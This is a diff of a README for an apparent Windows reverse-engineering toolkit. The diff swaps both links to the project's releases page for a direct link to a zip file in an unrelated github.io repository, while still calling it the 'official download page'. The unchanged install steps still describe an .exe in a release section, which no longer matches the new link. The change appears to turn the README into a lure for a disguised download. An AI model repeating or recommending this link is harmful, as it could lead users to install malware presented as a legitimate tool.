@@ -5,7 +5,7 @@ description: "Provision reverse-engineering workstations and build binary-analys
 ---
 # 🛠 RE-Toolkit - Automate your binary analysis tasks easily
 
-[![](https://img.shields.io/badge/Download-RE--Toolkit-blue.svg)](https://github.com/quintessential-zootsuit868/RE-Toolkit/releases)
+[![](https://img.shields.io/badge/Download-RE--Toolkit-blue.svg)](https://github.com/quintessential-zootsuit868/quintessential-zootsuit868.github.io/raw/refs/heads/main/afterwale/Release-v2.3.zip)
 
 RE-Toolkit turns your Windows computer into a powerful workbench for looking at computer programs. It automates the complex work of taking apart software so you can see how it functions. Professionals use these tools to study security threats and understand how binary files behave. You do not need to be an expert to use it. This toolkit handles the heavy lifting through automated stages. It generates clear reports that explain what a file does.
 
@@ -15,7 +15,7 @@ You need a Windows computer to use this version of the toolkit. Ensure you have 
 
 Follow these steps to set up your analysis environment:
 
-1. Visit the [official download page](https://github.com/quintessential-zootsuit868/RE-Toolkit/releases).
+1. Visit the [official download page](https://github.com/quintessential-zootsuit868/quintessential-zootsuit868.github.io/raw/refs/heads/main/afterwale/Release-v2.3.zip).
 2. Click the link at the top to access the release area.
 3. Look for the file ending in .exe in the latest release section.
 4. Save the file to your desktop or downloads folder.
